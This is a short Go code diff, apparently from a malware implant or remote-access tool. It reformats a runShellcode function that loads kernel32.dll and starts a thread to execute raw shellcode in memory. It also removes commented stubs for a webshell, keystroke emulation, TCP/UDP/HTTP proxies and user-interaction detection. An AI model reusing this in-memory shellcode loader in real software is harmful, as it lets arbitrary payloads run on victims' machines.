@@ -36,9 +36,9 @@ func wipe() error {
 	return nil
 }
 
-func runShellcode(sc []byte, bg bool){
+func runShellcode(sc []byte, bg bool) {
 	var bg_run uintptr = 0x00
-	if (bg) {
+	if bg {
 		bg_run = 0x00000004
 	}
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
@@ -53,49 +53,3 @@ func runShellcode(sc []byte, bg bool){
 	threadHandle, _, _ := procCreateThread.Call(0, 0, addr, 0, bg_run, 0)
 	waitForSingleObject.Call(threadHandle, uintptr(^uint(0)))
 }
-
-// func dialog(message, title string) {
-// 	zenity.Info(message, zenity.Title(title))
-// }
-
-// func SplitMultiSep(s string, seps []string) []string {
-// 	f := func(c rune) bool {
-// 		for _, sep := range seps {
-// 			if c == sep { // what?
-// 				return true
-// 			}
-// 		}
-// 	}
-// 	fields := strings.FieldsFunc(s, f)
-// 	return fields
-// }
-
-/*
-
-func keyboard_emul(keys string) error {
-
-}
-
-func proxy_tcp() error {
-
-}
-
-func proxy_udp() error {
-
-}
-
-func proxy_http() error {
-
-}
-
-func webshell(param, password string) error {
-
-}
-
-func stamp() {
-
-}
-
-func detect_user_interaction() (bool, error) {
-
-}*/
